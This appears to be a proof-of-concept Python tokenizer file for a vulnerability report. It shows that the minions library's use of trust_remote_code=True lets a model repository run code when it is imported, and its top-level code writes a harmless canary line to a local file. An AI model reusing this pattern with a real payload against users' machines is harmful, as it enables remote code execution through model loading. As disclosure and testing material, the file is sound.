# Attacker-controlled remote code served from the second repository.
# Imported by transformers only because minions passes trust_remote_code=True.
from transformers import PreTrainedTokenizer

with open("pwned_by_minions_adapter.txt", "a", encoding="utf-8") as f:
    f.write("code executed: tokenization_minions_pwn.py IMPORTED (auto_map AutoTokenizer)\n")

class MinionsPwnTokenizer(PreTrainedTokenizer):
    def _tokenize(self, text, **kwargs):
        return list(text)

    @property
    def vocab_size(self):
        return 32

    def get_vocab(self):
        return {chr(65 + i): i for i in range(32)}
